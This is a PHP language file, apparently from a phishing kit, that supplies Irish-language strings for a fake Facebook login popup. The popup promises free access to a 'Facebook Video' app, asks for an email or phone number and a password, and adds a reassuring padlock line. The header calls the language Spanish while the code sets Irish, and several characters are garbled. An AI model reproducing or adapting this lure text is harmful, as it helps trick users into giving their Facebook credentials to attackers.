<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'ga';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook iarratas';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Iarratais (saor in aisce)';
$lang['POPUP_DESCRIPCION'] = 'Facebook riachtanais a eolas seo a leanas a dhearbh� le go mbeidh rochtain leis an iarratas seo f�se�in, Log�il!';
$lang['POPUP_CORREO'] = 'R�omhphost n� ar an bhf�n';
$lang['POPUP_CONTRASENA'] = 'Pasfhocal';
$lang['POPUP_SUBMIT'] = 'Log In';
$lang['POPUP_CANDADO'] = 'N� h� seo an t-iarratas a cheada�tear a fhoilsi� ar Facebook.';

/*
$langGa = array("Ireland")
*/